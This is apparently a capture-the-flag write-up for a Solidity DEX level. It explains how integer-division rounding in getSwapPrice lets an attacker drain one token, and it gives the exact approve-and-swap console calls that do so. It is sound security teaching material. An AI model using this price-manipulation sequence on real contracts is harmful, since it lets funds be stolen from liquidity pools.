# Requirements

- The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

- You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

# Attack explanation

The vulnerability originates from get_swap_price method which determines the exchange rate between tokens in the Dex. The division in it won't always calculate to a perfect integer, but a fraction. And there is no fraction types in Solidity. Instead, division rounds towards zero. according to docs. For example, 3 / 2 = 1 in solidity.

```
function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
}

function swap(address from, address to, uint amount) public {
  require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
  require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
  uint swapAmount = getSwapPrice(from, to, amount);
  IERC20(from).transferFrom(msg.sender, address(this), amount);
  IERC20(to).approve(address(this), swapAmount);
  IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

We're going to swap all of our token1 for token2. Then swap all our token2 to obtain token1, then swap all our token1 for token2 and so on. On each swap we'll get more of token1 or token2 than held before previous swap. This is due to the inaccuracy of price calculation in get_swap_price method.

We could solve the challenge by making the next calls:

- Approve contract to transfer tokens in your behalf.

```
await contract.approve(instance, 500)
```

- Get token addresses:

```
t1 = await contract.token1()
t2 = await contract.token2()
```

- Perform swaps:

```
await contract.swap(t1, t2, 10)
await contract.swap(t2, t1, 20)
await contract.swap(t1, t2, 24)
await contract.swap(t2, t1, 30)
await contract.swap(t1, t2, 41)
await contract.swap(t2, t1, 45)
```

- We have drained token 1 succesfully.
